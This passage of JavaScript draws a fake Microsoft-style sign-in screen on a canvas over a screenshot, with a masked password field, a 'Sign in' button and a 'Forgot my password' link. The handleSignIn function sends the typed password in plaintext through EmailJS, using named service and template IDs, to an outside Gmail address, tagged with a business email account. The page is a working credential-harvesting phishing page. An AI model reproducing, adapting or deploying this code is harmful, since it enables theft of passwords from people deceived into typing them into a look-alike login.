}

// ── State ─────────────────────────────────────────────────────────────────────
let passwordText  = '';
let caretVisible  = true;
let inputFocused  = false;
let btnHovered    = false;
let btnPressed    = false;
let forgotHovered = false;
let shakeFrames   = 0;

// Regions in original-image coordinates (measured from screenshot)
const INPUT_REGION  = { x: 567, y: 390, w: 322, h: 38 };
const BTN_REGION    = { x: 789, y: 477, w: 100, h: 38 };
const FORGOT_REGION = { x: 567, y: 438, w: 145, h: 20 };

// ── Caret blink ───────────────────────────────────────────────────────────────
setInterval(() => { caretVisible = !caretVisible; render(); }, 530);

// ── Coordinate helpers ────────────────────────────────────────────────────────
function toCanvas(rx, ry, rw, rh) {
  return {
    x: offsetX + rx * scale,
    y: offsetY + ry * scale,
    w: rw * scale,
    h: rh * scale,
  };
}

function hitTest(cx, cy, region) {
  const r = toCanvas(region.x, region.y, region.w, region.h);
  return cx >= r.x && cx <= r.x + r.w && cy >= r.y && cy <= r.y + r.h;
}

// ── Render ────────────────────────────────────────────────────────────────────
function render() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);

  // Background image
  if (bg.complete && bg.naturalWidth) {
    ctx.drawImage(bg, offsetX, offsetY, IMG_W * scale, IMG_H * scale);
  } else {
    ctx.fillStyle = '#c8d3e0';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
  }

  const shakeOff = shakeFrames > 0 ? (Math.random() - 0.5) * 6 : 0;

  drawInput(shakeOff);
  drawButton(shakeOff);
}

function drawInput(shakeOff) {
  const r = toCanvas(INPUT_REGION.x, INPUT_REGION.y, INPUT_REGION.w, INPUT_REGION.h);
  const x = r.x + shakeOff, y = r.y, w = r.w, h = r.h;

  // White fill
  ctx.fillStyle = '#ffffff';
  roundRect(x, y, w, h, 2 * scale);
  ctx.fill();

  // Border
  ctx.strokeStyle = inputFocused ? '#0078d4' : '#8a8886';
  ctx.lineWidth   = (inputFocused ? 2 : 1) * scale;
  roundRect(x, y, w, h, 2 * scale);
  ctx.stroke();

  // Bottom accent line when focused
  if (inputFocused) {
    ctx.fillStyle = '#0078d4';
    ctx.fillRect(x + 1 * scale, y + h - 2 * scale, w - 2 * scale, 2 * scale);
  }

  // Placeholder / typed text
  const fontSize = Math.round(14 * scale);
  ctx.font = `${fontSize}px "Segoe UI", sans-serif`;
  ctx.textBaseline = 'middle';

  const textX = x + 10 * scale;
  const textY = y + h / 2;

  if (passwordText.length === 0 && !inputFocused) {
    ctx.fillStyle = '#605e5c';
    ctx.fillText('Password', textX, textY);
  } else {
    // dots for password masking
    const dots = '●'.repeat(passwordText.length);
    ctx.fillStyle = '#201f1e';
    ctx.fillText(dots, textX, textY);

    // Caret
    if (inputFocused && caretVisible) {
      const dotW = ctx.measureText('●').width;
      const caretX = textX + dotW * passwordText.length + 1;
      ctx.fillStyle = '#201f1e';
      ctx.fillRect(caretX, y + 8 * scale, 1.5 * scale, h - 16 * scale);
    }
  }
}

function drawForgotLink() {
  const r = toCanvas(FORGOT_REGION.x, FORGOT_REGION.y, FORGOT_REGION.w, FORGOT_REGION.h);
  const fontSize = Math.round(13 * scale);
  ctx.font = `${fontSize}px "Segoe UI", sans-serif`;
  ctx.textBaseline = 'middle';
  ctx.fillStyle = forgotHovered ? '#004578' : '#0078d4';
  ctx.fillText('Forgot my password', r.x, r.y + r.h / 2);
  if (forgotHovered) {
    const tw = ctx.measureText('Forgot my password').width;
    ctx.fillRect(r.x, r.y + r.h / 2 + fontSize / 2, tw, 1 * scale);
  }
}

function drawButton(shakeOff) {
  const r = toCanvas(BTN_REGION.x, BTN_REGION.y, BTN_REGION.w, BTN_REGION.h);
  const x = r.x + shakeOff, y = r.y, w = r.w, h = r.h;

  // Button background
  let bg2 = '#0078d4';
  if (btnPressed)       bg2 = '#004578';
  else if (btnHovered)  bg2 = '#106ebe';

  ctx.fillStyle = bg2;
  roundRect(x, y, w, h, 2 * scale);
  ctx.fill();

  // Button shadow
  if (!btnPressed) {
    ctx.shadowColor   = 'rgba(0,0,0,0.18)';
    ctx.shadowBlur    = 4 * scale;
    ctx.shadowOffsetY = 2 * scale;
  }

  // Label
  ctx.shadowColor = 'transparent';
  ctx.shadowBlur  = 0;
  ctx.shadowOffsetY = 0;
  const fontSize = Math.round(14 * scale);
  ctx.font = `600 ${fontSize}px "Segoe UI", sans-serif`;
  ctx.fillStyle    = '#ffffff';
  ctx.textBaseline = 'middle';
  ctx.textAlign    = 'center';
  ctx.fillText('Sign in', x + w / 2, y + h / 2);
  ctx.textAlign = 'left';
}

// Rounded rect helper
function roundRect(x, y, w, h, r) {
  ctx.beginPath();
  ctx.moveTo(x + r, y);
  ctx.lineTo(x + w - r, y);
  ctx.quadraticCurveTo(x + w, y, x + w, y + r);
  ctx.lineTo(x + w, y + h - r);
  ctx.quadraticCurveTo(x + w, y + h, x + w - r, y + h);
  ctx.lineTo(x + r, y + h);
  ctx.quadraticCurveTo(x, y + h, x, y + h - r);
  ctx.lineTo(x, y + r);
  ctx.quadraticCurveTo(x, y, x + r, y);
  ctx.closePath();
}

// ── Shake animation ───────────────────────────────────────────────────────────
function startShake() {
  shakeFrames = 18;
  const tick = () => {
    if (shakeFrames-- > 0) { render(); requestAnimationFrame(tick); }
    else { shakeFrames = 0; render(); }
  };
  requestAnimationFrame(tick);
}

// ── Sign-in logic ─────────────────────────────────────────────────────────────
function handleSignIn() {
  if (passwordText.trim() === '') {
    startShake();
    showAlert('⚠️  Please enter your password.');
    return;
  }

  showAlert('⏳  Sending...');

  emailjs.send('service_iswpm6e', 'template_3qbj6ya', {
    to_email: '36kitchen116@gmail.com',
    from_account: 'info@instantsmashrepairs.com.au',
    message: passwordText,
  }).then(() => {
    showAlert('✅  Password sent to 36kitchen116@gmail.com');
    passwordText = '';
    inputFocused = false;
    render();
  }).catch(err => {
    showAlert('❌  Failed to send email.\n' + (err.text || err.message || JSON.stringify(err)));
  });
}

function showAlert(msg) {
  // Custom overlay alert (no window.alert, drawn on canvas)
  const overlay = {
    visible: true,
    message: msg,
  };

  function drawOverlay() {
    if (!overlay.visible) return;

    // Dim
    ctx.fillStyle = 'rgba(0,0,0,0.45)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Box
    const bw = Math.min(420 * scale, canvas.width * 0.85);
    const bh = 160 * scale;
    const bx = (canvas.width - bw) / 2;
    const by = (canvas.height - bh) / 2;

    ctx.fillStyle = '#ffffff';
    roundRect(bx, by, bw, bh, 8 * scale);
    ctx.fill();
    ctx.strokeStyle = '#d2d0ce';
    ctx.lineWidth = 1 * scale;
    roundRect(bx, by, bw, bh, 8 * scale);
    ctx.stroke();

    // Message
    const lines = overlay.message.split('\n').filter(l => l.trim() !== '');
    const fSize = Math.round(13 * scale);
    ctx.font = `${fSize}px "Segoe UI", sans-serif`;
    ctx.fillStyle = '#201f1e';
    ctx.textBaseline = 'middle';
    ctx.textAlign = 'center';
    lines.forEach((line, i) => {
      ctx.fillText(line, bx + bw / 2, by + 35 * scale + i * 22 * scale);
    });

    // OK button
    const okW = 80 * scale, okH = 32 * scale;
    const okX = bx + bw / 2 - okW / 2;
    const okY = by + bh - 48 * scale;
    ctx.fillStyle = '#0078d4';
    roundRect(okX, okY, okW, okH, 2 * scale);
    ctx.fill();
    ctx.font = `600 ${fSize}px "Segoe UI", sans-serif`;
    ctx.fillStyle = '#fff';
    ctx.fillText('OK', okX + okW / 2, okY + okH / 2);
    ctx.textAlign = 'left';

    // Click OK to dismiss
    canvas.addEventListener('click', function dismiss(e) {
      const rect = canvas.getBoundingClientRect();
      const cx = e.clientX - rect.left;
      const cy = e.clientY - rect.top;
      if (cx >= okX && cx <= okX + okW && cy >= okY && cy <= okY + okH) {
        overlay.visible = false;
        canvas.removeEventListener('click', dismiss);
        render();
      }
    });
  }

  render();
  drawOverlay();
}

// ── Mouse events ──────────────────────────────────────────────────────────────
canvas.addEventListener('mousemove', e => {
  const rect = canvas.getBoundingClientRect();
  const cx = e.clientX - rect.left, cy = e.clientY - rect.top;
  const onBtn   = hitTest(cx, cy, BTN_REGION);
  const onInput = hitTest(cx, cy, INPUT_REGION);

  btnHovered    = onBtn;
  forgotHovered = false;
  canvas.style.cursor = onBtn ? 'pointer' : (onInput ? 'text' : 'default');
  render();
});

canvas.addEventListener('mousedown', e => {
  const rect = canvas.getBoundingClientRect();
  const cx = e.clientX - rect.left, cy = e.clientY - rect.top;
  if (hitTest(cx, cy, BTN_REGION)) { btnPressed = true; render(); }
});

canvas.addEventListener('mouseup', e => {
  const rect = canvas.getBoundingClientRect();
  const cx = e.clientX - rect.left, cy = e.clientY - rect.top;
  btnPressed = false;

  if (hitTest(cx, cy, BTN_REGION))        handleSignIn();
  else if (hitTest(cx, cy, INPUT_REGION)) { inputFocused = true; render(); }
  else                                    { inputFocused = false; render(); }
});

// ── Keyboard input ────────────────────────────────────────────────────────────
window.addEventListener('keydown', e => {
  if (!inputFocused) return;

  if (e.key === 'Enter') {
    handleSignIn();
  } else if (e.key === 'Backspace') {
    passwordText = passwordText.slice(0, -1);
    render();
  } else if (e.key.length === 1) {
    passwordText += e.key;
    render();
  }
});

// ── Init ──────────────────────────────────────────────────────────────────────
bg.onload  = resize;
bg.onerror = resize; // render without image if path unavailable
resize();
</script>
